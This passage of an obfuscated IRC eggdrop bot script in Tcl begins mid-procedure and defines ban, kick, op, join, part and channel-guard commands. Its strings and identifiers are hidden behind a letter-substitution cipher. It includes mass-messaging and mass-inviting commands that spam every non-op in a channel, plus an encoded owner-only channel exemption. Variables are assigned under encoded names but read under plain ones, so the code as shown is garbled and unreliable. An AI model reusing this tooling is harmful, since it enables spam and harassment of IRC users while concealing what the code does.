set [lines "slhgnzhp"] [getchanhost $handle $channel]
set [lines "slhgnzhp"] "*!*@[lindex [split $hostmask @] 1]"
if {![onchan $handle $channel]} { 
set [lines "slhgnzhp"] [lindex $rest 0] 
}
if {$hostmask != "*!*@*"} {
putserv "MODE $channel +b $hostmask" 
}
}
proc [lines "kfy_fmyzm"] {nick uhost hand chan rest} {
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: fmyzm <mrxp/slhgnzhp> <#xszmmvo>"
return 0
}
if {[lindex $rest 1] != ""} { 
set [lines "xszm"] [lindex $rest 1] 
}
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "szmwov"] [lindex $rest 0]
append userhost $handle "!*" [getchanhost $handle $chan]
set [lines "slhgnzhp"] [maskhost $userhost]
if {![onchan $handle $chan]} { 
set [lines "slhgnzhp"] [lindex $rest 0] 
}
putserv "MODE $chan -b $hostmask"
puthlp "MLGRXV ~$nick ~:~$notc ~FmYzM ~[unsix $hostmask]~ LM ~$chan"
}
proc [lines "kfy_fk"] {nick uhost hand channel rest} {
global notc botnick unop
catch {unset unop($nick)}
if {![isop $botnick $channel]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![isop $nick $channel]} {
opq $channel $nick
}
return 0
}
proc [lines "kfy_wldm"] {nick uhost hand channel rest} {
global notc botnick
if {![isop $botnick $channel]} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick m]} {
set [lines "nivj"] "4M14asTeR.4R14eQuesT"
}
if {[matchattr $nick n]} {
set [lines "nivj"] "4A14DmIN.4R14eQuesT"
}
if {[isop $nick $channel]} {
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -ko $mreq $nick"
} {
putserv "mode $channel -o $nick"
}
}
return 0
}
proc [lines "kfy_nfmyzmh"] {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "yzmh"] ""
set [lines "r"] 0
foreach x [chanbans $chan] {
if {$i < 5} {
append bans " [lindex $x 0]"
set [lines "r"] [incr i]
}
if {$i == 5} {
puthelp "MODE $chan -bbbbb $bans"
set [lines "yzmh"] ""
append bans " [lindex $x 0]"
set [lines "r"] 0
}
}
puthelp "MODE $chan -bbbbb $bans"
if {![onchan $nick $chan]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~NfMYzMH \[~$chan\]"
}
return 0
}
proc [lines "kfy_yzmorhg"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM xSzM ~$chan."
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [chanbans $chan] {
puthlp "MLGRXV ~$nick ~:~$notc ~~$x"
}
if {[chanbans $chan] == ""} { 
puthlp "MLGRXV ~$nick ~:~$notc ~YzMORhG ~$chan ~<m/z>"
}
return 0
}
proc [lines "kfy_nlwv"] {nick uhost hand chan rest} { 
global notc botnick
if {![isop $botnick $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: mode +/- ntspnmcilk"
return 0
}
putserv "mode $chan $rest"
}
proc [lines "kfy_hzb"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: hzb <nht>"
}
puthlp "KIRENHT ~$channel ~:~$rest"
}
set rms {
 "4R.e.l.o.a.d" "K.4i.L.4L.i.4n.G" "T.4e.R.4m.I.4N.a.4T.i.4O.n" "14aLo(4W14)aiNi.v4" "14aLo(5W14)aiNi.v4" "14aLo(6W14)aiNi.v4" "14aLo(7W14)aiNi.v4" "14aLo(10W14)aiNi.v4" "14aLo(12W14)aiNi.v4"
 "14aLo(14W14)aiNi.v4" "14aLo(1W14)aiNi.v4" "14aLo(2W14)aiNi.v4" "14aLo(3W14)aiNi.v4" "4a.L.o.W.a.i.N.i.B.o.T" "5a.L.o.W.a.i.N.i.B.o.T" "6a.L.o.W.a.i.N.i.B.o.T" "7a.L.o.W.a.i.N.i.B.o.T" "10a.L.o.W.a.i.N.i.B.o.T"
 "12a.L.o.W.a.i.N.i.B.o.T" "14a.L.o.W.a.i.N.i.B.o.T" "1a.L.o.W.a.i.N.i.B.o.T" "2a.L.o.W.a.i.N.i.B.o.T" "3a.L.o.W.a.i.N.i.B.o.T" "a.4L.o.4W.a.4i.N.4i" "4have.a.nice.day" "5have.a.nice.day" "6have.a.nice.day"
 "7have.a.nice.day" "10have.a.nice.day" "12have.a.nice.day" "14have.a.nice.day" "1have.a.nice.day" "2have.a.nice.day" "3have.a.nice.day" "4spam.checks"  "6spam.checks" "7spam.checks" "10spam.checks" "12spam.checks"
 "14spam.checks" "1spam.checks" "2spam.checks" "3spam.checks" "4a.n.t.i.s.p.a.m" "5a.n.t.i.s.p.a.m" "6a.n.t.i.s.p.a.m" "7a.n.t.i.s.p.a.m" "10a.n.t.i.s.p.a.m" "12a.n.t.i.s.p.a.m" "14a.n.t.i.s.p.a.m" "1a.n.t.i.s.p.a.m"
 "2a.n.t.i.s.p.a.m" "3a.n.t.i.s.p.a.m" "4r.e.f.r.e.s.h.i.n.g" "5r.e.f.r.e.s.h.i.n.g"  "6r.e.f.r.e.s.h.i.n.g"  "7r.e.f.r.e.s.h.i.n.g"  "10r.e.f.r.e.s.h.i.n.g"  "12r.e.f.r.e.s.h.i.n.g"  "14r.e.f.r.e.s.h.i.n.g"  "1r.e.f.r.e.s.h.i.n.g"
 "2r.e.f.r.e.s.h.i.n.g"  "3r.e.f.r.e.s.h.i.n.g"  "4r.e.p.o.r.t"  "5r.e.p.o.r.t"  "6r.e.p.o.r.t"  "7r.e.p.o.r.t"  "10r.e.p.o.r.t"  "12r.e.p.o.r.t"  "14r.e.p.o.r.t"  "1r.e.p.o.r.t"  "2r.e.p.o.r.t"  "3r.e.p.o.r.t"
}
proc [lines "kfy_ivhbmx"] {nick uhost hand channel rest} {
global botnick vern rms rmsg
set rmsg [lindex $rms [rand [llength $rms]]]
set [lines "evim2"] $vern
regsub -all --  $vern2 "" vern2
if {![string match "*k*" [getchanmode $channel]]} {
putserv "mode $channel -vok+ov $botnick $botnick $rmsg $botnick $botnick"
} {
putserv "mode $channel -o+o $botnick $botnick"
}
}
proc [lines "kfy_mlgrxv"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: mlgrxv <mrxp> <nht>"
}
set [lines "kvihlm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
if {$rest!=""} {
puthlp "MLGRXV ~$person ~:~$rest"
return 0
}
}
proc [lines "kfy_nht"] {nick uhost hand channel rest} {
global owner notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nht <mrxp> <nht>"
}
set [lines "kvihlm"] [string tolower [lindex $rest 0]]
set [lines "ivhg"] [lrange $rest 1 end]
if {[string match "*serv*" $person]} {
puthlp "MLGRXV ~$nick ~:~$notc4 ~WvMRVw..! Xzm'g hvmw nvhhztv gl Hvierxv."
return 0
}
if {$person == [string tolower $owner]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "KIRENHT ~$person ~:~$rest"
}
proc [lines "kfy_zxg"] {nick uhost hand channel rest} {
global notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: zxg <nht>"
}
puthlp "KIRENHT ~$channel ~:\001ZXGRLM ~$rest\001"
return 0
}
proc [lines "kfy_rmergv"] {nick uhost hand chan rest} {
global notc 
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: rmergv <mrxp> <#xszmmvo>"
}
set [lines "dsl"] [lindex $rest 0]
set [lines "glxszm"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$tochan != ""} {
if {![onchan $who $tochan]} {
puthlp "RMERGV ~$who ~:~$tochan"
puthlp "MLGRXV ~$nick ~:~$notc ~RmeRgV ~$who ~Gl ~$tochan"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~rh zoivzwb lm gsv ~$tochan"
}
if {![onchan $who $chan]} {
putsrv "RMERGV ~$who ~:~$chan"
puthlp "MLGRXV ~$nick ~:~$notc ~Rmergzgrlm gl ~$chan ~szh yvvm hvmg gl ~$who"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$who ~rh zoivzwb lm gsv xszmmvo"
}
proc [lines "nht_A"] {nick uhost hand rest} {
global notc
if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {[string index [lindex $rest 1] 0] == "#"} {
if {![validchan [lindex $rest 1]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~[lindex $rest 1]~"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4zfgs 1hg!"
return 0
}
set [lines "tlgl"] [lindex $rest 0]
if {[string index $rest 0] == "."} {
regsub "." $goto "msg_" goto
set [lines "ivhg"] [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $rest }
return 0
}
regsub -all "`" $goto "pub_" goto
if {[string index [lindex $rest 1] 0] == "#"} {
set [lines "xszm"] [lindex $rest 1]
set [lines "ivhg"] [lrange $rest 2 end]
} else {
set [lines "xszm"] "*"
set [lines "ivhg"] [lrange $rest 1 end]
}
catch { $goto $nick $uhost $hand $chan $rest }
}
proc [lines "nht_nnht"] {nick uhost hand rest} {
pub_mmsg $nick $uhost $hand "*" $rest
}
proc [lines "kfy_nnht"] {nick uhost hand chan rest} {
global cmd_chn cmd_by cmd_msg cmd_case notc
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nnht <#xszmmvo> <gvcg>"
return 0
}
set [lines "glxszm"] [lindex $rest 0]
set [lines "gcg"] [lrange $rest 1 end]
if {$txt==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nnht <#xszmmvo> <gvcg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string first # $tochan] != 0} { 
set [lines "xszm"] "#$tochan" 
}
if {![validchan $tochan]} {
set [lines "xnw_xsm"] $tochan
set [lines "xnw_nht"] $rest
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "2"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
putsrv "MLGRXV ~$nick ~:~$notc ~HGzIGRMT NzHHNHT ~$tochan"
set [lines "nvnyvih"] [chanlist $tochan]
foreach x $members {
if {![isop $x $tochan]} {
puthlp "KIRENHT ~$x ~:~$txt"
}
}
utimer 2 del_nobase
puthlp "MLGRXV ~$nick ~:~$notc ~NzHHNHT ~$tochan ~4WlMV."
}
proc [lines "kfy_nrmergv"] {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nrmergv <#xszmmvo> <#gl xszmmvo>"
}
set [lines "xszm"] [lindex $rest 1]
if {$chan == ""} {
set [lines "xszm"] $channel
} else {
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "glxszm"] [lindex $rest 0]
if {[string first # $tochan] != 0} { 
set [lines "glxszm"] "#$tochan" 
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {![validchan $tochan]} { 
set [lines "xnw_xsm"] $tochan
set [lines "xnw_nht"] $tochan
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "3"
channel add $tochan
catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
if {[isop $botnick $chan]} { 
putserv "mode $chan -o $botnick" 
}
putsrv "MLGRXV ~$nick ~:~$notc ~Hgzigrmt nzhh rmergv gl ~$tochan"
set [lines "nvnyvih"] [chanlist $tochan]
foreach x $members {
if {(![onchan $x $chan]) && (![isop $x $tochan])} { 
putsrv "RMERGV ~$x ~:~$chan"
}
}
utimer 2 del_nobase
puthlp "MLGRXV ~$nick ~:~$notc ~RmERGV ~$tochan ~RmGL ~$chan ~4WlMV."
}
proc [lines "kfy_qlrm"] {nick uhost hand chan rest} {
global botnick joinme own notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan] != 0} { 
set [lines "xszm"] "#$chan" 
}
if {$chan=="#"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qlrm <#xszmmvo>"
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$x ~IvZWB!"
return 0
}
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chan
catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chan ~:~[lindex $rest 1]~" 
}
}
proc [lines "kfy_+xszm"] {nick uhost hand chan rest} {
global botnick joinme owner notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!YOlXpVw!"
return 0
}
set [lines "xszm"] [lindex $rest 0]
set [lines "lkg"] [lindex $rest 1]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
if {$chan=="#"} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +xszm <#xszmmvo>"
return 0
}
if {[validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~rh zoivzwb lm xszmmvoh"
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~GL NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chan
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chan ~:~[lindex $rest 1]~" 
}
}
proc [lines "glgzo_xszmmvo"] {} {
global notc 
set [lines "glgzo_xszm"] 0
foreach x [channels] {
incr total_chan
}
if {$total_chan > 9} { return 0 }
return 1
}
## badchan start
bind pub n `+badchan pub_+badchan
setudef flag badchan
proc pub_+badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +badchan }
  puthelp "NOTICE $nick :$notc BadChan Kick $chan \[9ON\]"
  saveuser
}
bind pub n `-badchan pub_-badchan
proc pub_-badchan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-badchan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc BadChan Kick $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -badchan }
  puthelp "NOTICE $nick :$notc BadChan Kick $chan \[4Off\]"
  saveuser
}
if {[info exists bchan]} {unset bchan}
set bchan(rescan) 1
set bc_flood 4:5
set bchan(exempt) ""
set bchan(protect-hosts) { *!*@alowaini.com }
if {[info exists bcqueue]} {unset bcqueue}
set bchan(chans) ""
proc bchan_read {} {
  global bchan
  set fd [open scripts/badchan.conf r]
  while {![eof $fd]} {
    set inp [gets $fd]
    if {[string trim $inp " "] == ""} {continue}
    set ban [lrange $inp 1 e]
    set chan [string tolower [lindex $inp 0]]
    if {[lsearch $bchan(chans) $chan] == -1} {lappend bchan(chans) $chan}
    lappend bchan($chan) $ban
  }
  close $fd
  putlog "badchan.conf loaded."
}
if {[file exists scripts/badchan.conf]} {bchan_read} {putlog "badchan.conf not found!"}
proc bc_flood_init {} {
  global bc_flood bc_flood_num bc_flood_time bc_flood_array
  if {![string match *:* $bc_flood]} {putlog bchan: var bc_flood not set correctly. ; return 1}
  set bc_flood_num [lindex [split $bc_flood :] 0]
  set bc_flood_time [lindex [split $bc_flood :] 1]
  set i [expr $bc_flood_num - 1]
  while {$i >= 0} { set bc_flood_array($i) 0 ; incr i -1 }
} ; bc_flood_init
proc bc_flood {nick uhost} {
  global bc_flood_num bc_flood_time bc_flood_array
  if {$bc_flood_num == 0} {return 0}
  set i [expr $bc_flood_num - 1]
  while {$i >= 1} { set bc_flood_array($i) $bc_flood_array([expr $i - 1]) ; incr i -1 }
  set bc_flood_array(0) [unixtime]
  if {[expr [unixtime] - $bc_flood_array([expr $bc_flood_num - 1])] <= $bc_flood_time} {
    putlog "bchan: Flood detected from $nick."
    newignore [join [maskhost *!*[string trimleft $uhost ~]]] bchan flood 2
    return  1
  } {return 0}
}
bind raw - 319 bc_whois
proc bc_whois {from key args} {
  global bchan bcqueue bcnicks notc mhost bannick
  set args [join $args]
  set nick [lindex $args 1]
  if {[info exists bcnicks($nick)]} {set chan $bcnicks($nick)} {return 0}
  set chans [string tolower [lrange $args 2 e]]
  if {[lsearch $bchan(exempt) $chan] == -1 && $bchan(global) != ""} {set bans $bchan(global)} {set bans ""}
  if {[lsearch $bchan(chans) $chan] > -1} {set bans "$bans $bchan($chan)"}
  foreach tok $chans {
    set tok [string trimleft $tok ":@+"]
    foreach ban $bans {
      if {[string match [lindex $ban 0] $tok]} {
        set badchanhost "*!*[string trimleft [string range [getchanhost $nick $chan] [string first "!" [getchanhost $nick $chan]] end] ~]"
        putlog "args: $args, ban: $ban"
        if {[onchan $nick $chan]} { putserv "KICK $chan $nick :$notc 14BaD4ChaN [string trim [lrange $ban 0 0] "*"] 4[lrange $ban 1 e] [banmsg]" ; putserv "mode $chan +b $badchanhost" }
        return 0
  } } }
  return 0
}
bind pub n !gbclist bc_glist
proc bc_glist {1 2 3 4 5} {bc_list $1 $2 $3 global $5}
bind pub n !bclist bc_list
proc bc_list {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  set i 1
  puthelp "notice $nick :BadChans for $chan..."
  foreach ban $bchan($chan) { puthelp "notice $nick :$i) $ban" ; incr i }
}
bind pub n !gabc bc_gadd
proc bc_gadd {1 2 3 4 5} {bc_add $1 $2 $3 global $5}
bind pub n !abc bc_add
proc bc_add {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  if {![string match *\\\** [lindex $args 0]]} {puthelp "notice $nick :syntax is: !abc <chanmask> \[reason\]" ; return 1}
  set args [string trimright "[string tolower [lindex $args 0]] [lrange $args 1 e]" " "]
  if {[lsearch $bchan(chans) $chan]} {lappend bchan(chans) $chan}
  lappend bchan($chan) $args
  puthelp "notice $nick :[lindex $args 0] was added to $chan's badchan list."
  bchan_save
  return 1
}
bind pub n !grbc bc_grem
proc bc_grem {1 2 3 4 5} {bc_rem $1 $2 $3 global $5}
bind pub n !rbc bc_rem
proc bc_rem {nick uhost hand chan args} {
  global bchan
  set chan [string tolower $chan]
  set args [string tolower [lindex [join $args] 0]]
  if {[lsearch $bchan(chans) $chan] == -1} {puthelp "notice $nick :No badchans are registered for $chan." ; return 1}
  if {![string match *\\\** $args]} {puthelp "notice $nick :syntax is: !rbc <chanmask>" ; return 1}
  set i 0
  set temp ""
  foreach ban $bchan($chan) { if {[string compare $args [lindex $ban 0]] == 0} {incr i} {lappend temp $ban} }
  if {$i > 0} {
    if {$temp != ""} {set bchan($chan) $temp} {
      unset bchan($chan)
      set temp [lsearch $bchan(chans) $chan]
      if {$temp == -1} {putlog "bchan: I'm confused." ; return 1}
      set bchan(chans) [lreplace $bchan(chans) $temp $temp]
    }
    puthelp "notice $nick :$args was removed from $chan's badchan list."
    bchan_save
  } {puthelp "notice $nick :$args was not found in $chan's badchan list."}
  return 1
}
proc bchan_save {} {
  global bchan
  set fd [open scripts/badchan.conf w]
  foreach chan $bchan(chans) { foreach ban $bchan($chan) { puts $fd "$chan $ban" } }
  close $fd
}
##badchan stop
proc [lines "kfy_kzig"] {nick uhost hand chan rest} { 
global notc ps quick
set [lines "xfigrnv"] [ctime [unixtime]]
set [lines "kzig_nht"] [lrange $rest 1 end]
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan ~4KIlGvxGVw..!"
return 0
}
if {![onchan $nick $chan]} { 
putsrv "MLGRXV ~$nick ~:~$notc ~KzIG ~$chan"
}
if {$part_msg != ""} {
if {$quick == "1"} {
putqck "KZIG ~$chan ~:14~$part_msg) (~[lgrnd]"
} {
putsrv "KZIG ~$chan ~:14~$part_msg) (~[lgrnd]"
}
} {
if {$quick == "1"} {
putqck "KZIG ~$chan ~:YzxpGlYzhv (Lm ~$curtime)"
} {
putsrv "KZIG ~$chan ~:YzxpGlYzhv (Lm ~$curtime)"
}
}
channel remove $chan
savechan
return 0
}
set [lines "olxpxszm"] ""
proc [lines "kfy_+rmergvolxp"] {nick uhost hand chan rest} {
global lockchan notc 
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~RmERGV xSzM ~$chan ~\[9LM\]"
set [lines "olxpxszm"] $chan
return 0
}
proc [lines "kfy_-rmergvolxp"] {nick uhost hand chan rest} { 
global lockchan notc 
if {$rest != ""} { 
set [lines "xszm"] [lindex $rest 0]
if {[string first # $rest]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {![validchan $chan] || $lockchan == ""} { return 0 }
set [lines "olxpxszm"] ""
puthlp "MLGRXV ~$nick ~:~$notc ~RmeRgV xSzM ~$chan ~\[4LUU\]"
return 0
}
proc [lines "xbxov"] {chan} {
  global cyclemsg notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![string match "*c*" [getchanmode $chan]]} {
set [lines "gvcg"] "14[cyclemsg]) ([lgrnd]"
} {
set text "((((cycle))))"
}
putsrv "KZIG ~$chan ~:~$text"
if {[matchattr $cflag K]} {
putsrv "QLRM ~$chan ~:~[dezip [getuser $cflag XTRA "CI"]~]"
} {
putsrv "QLRM ~$chan"
}
if {[matchattr $cflag C]} {
if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
}
}
proc [lines "kfy_xbxov"] {nick uhost hand chan rest} {
global notc
set [lines "ivhg"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest==""} {
if {![onchan $nick $chan]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOV ~$chan"
}
cycle $chan
return 0
} else {
if {[string index $rest 0] != "#"} {
set [lines "ivhg"] "#$rest"
}
if {[botonchan $rest]} { cycle $rest }
}
}
proc [lines "kfy_+nzhhqlrm"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x +J
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO NzHhQlRM XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag J]} {
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +J
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-nzhhqlrm"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x -J
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO NzHhQlRM XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag J]} {
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -J
puthlp "MLGRXV ~$nick ~:~$notc ~NzHhQlRM ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+tfziw"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [channels] {
catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO TfzIw XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
if {[string match "*+greet*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIw ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
puthlp "MLGRXV ~$nick ~:~$notc ~TfZIW ~$chan ~\[9LM\]"
savechan
}
proc [lines "kfy_-tfziw"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
